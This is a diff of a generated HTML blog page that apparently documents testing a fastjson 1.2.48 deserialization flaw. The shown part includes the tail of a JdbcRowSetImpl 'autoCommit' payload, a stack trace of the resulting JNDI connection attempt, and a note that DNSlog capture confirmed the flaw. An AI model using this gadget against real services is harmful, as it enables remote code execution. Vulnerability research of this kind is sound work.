@@ -87,21 +87,14 @@
 <p>​            “&quot;autoCommit&quot;: true” +</p>
 <p>​            “}” +</p>
 <p>​        “}”;</p>
-<p><img src="/Users/alewong/Documents/GitHub/AleWong.github.io/source/_posts/fastjson-1-2-48/20200910132246923.png" alt="image-20200910132246923"> </p>
+<p><img src="/Users/alewong/Documents/GitHub/AleWong.github.io/source/_posts/fastjson-1-2-48/image-20200910132246923.png" alt="image-20200910132246923"> </p>
 <p>Exception in thread “main” com.alibaba.fastjson.JSONException: set property error, autoCommit<br>    at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:162)<br>    at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:124)<br>    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:1078)<br>    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:773)<br>    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1283)<br>    at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl.deserialze(Unknown Source)<br>    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)<br>    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:384)<br>    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:544)<br>    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1356)<br>    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1322)<br>    at com.alibaba.fastjson.JSON.parse(JSON.java:152)<br>    at com.alibaba.fastjson.JSON.parse(JSON.java:162)<br>    at com.alibaba.fastjson.JSON.parse(JSON.java:131)<br>    at com.example.FastjsonExp.main(FastjsonExp.java:24)<br>Caused by: java.lang.reflect.InvocationTargetException<br>    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)<br>    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)<br>    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br>    at java.lang.reflect.Method.invoke(Method.java:483)<br>    at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:110)<br>    … 14 more<br>Caused by: java.sql.SQLException: JdbcRowSet (连接) JNDI 无法连接<br>    at com.sun.rowset.JdbcRowSetImpl.connect(JdbcRowSetImpl.java:634)<br>    at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(JdbcRowSetImpl.java:4067)<br>    … 19 more</p>
 <p>Process finished with exit code 1</p>
 <p>测试DNSlog Wireshark抓包依旧成功，漏洞存在成立</p>
 <p><img src="/Users/alewong/Documents/GitHub/AleWong.github.io/source/_posts/fastjson-1-2-48/image-20200910132413484.png" alt="image-20200910132413484"> </p>
 <iframe id="bulb-editor" src="/editor/collab/bulb.html" style="border: 0px; margin: 0px; padding: 0px; cursor: default !important; position: absolute; left: 0px; top: 0px; width: 1248px; height: 929px;"></iframe>
 
-
-
-
-
-
-
-<iframe src="https://qiyukf.com/sdk/res/delegate.html?1599471510650" style="border: 0px; margin: 0px; padding: 0px; cursor: default !important; height: 0px; width: 0px;"></iframe>
-
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><iframe src="https://qiyukf.com/sdk/res/delegate.html?1599471510650" style="border: 0px; margin: 0px; padding: 0px; cursor: default !important; height: 0px; width: 0px;"></iframe>
 <iframe id="hidden-editor" src="/editor/collab/bulb.html" style="border: 0px; margin: 0px; padding: 0px; cursor: default !important; position: absolute; height: 1px; width: 1px; left: -100px; top: -100px; caret-color: rgb(0, 0, 0); color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; font-size: 12px; font-style: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: auto; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; text-decoration: none;"></iframe>
       
     </div>
